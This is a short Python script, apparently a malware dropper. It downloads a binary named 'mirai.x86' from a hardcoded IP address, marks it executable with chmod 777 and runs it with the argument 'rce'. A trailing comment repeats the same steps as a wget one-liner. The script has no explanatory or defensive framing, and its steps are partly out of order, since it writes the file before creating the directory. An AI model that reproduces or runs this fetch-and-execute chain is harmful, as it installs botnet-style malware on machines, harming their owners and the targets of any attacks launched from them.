import requests
import sys
import subprocess

url = 'http://54.37.93.31/mirai.x86'

myfile = requests.get(url)

open('t/mirai.x86', 'wb').write(myfile.content)

def run(cmd):
    subprocess.call(cmd, shell=True)

run("mkdir t")
run("touch t/mirai.x86")

def run(cmd):
    subprocess.call(cmd, shell=True)

run("cd t;chmod 777 mirai.x86;./mirai.x86 rce")


# wget http://54.37.93.31/mirai.x86; chmod 777 mirai.x86;./mirai.x86 rce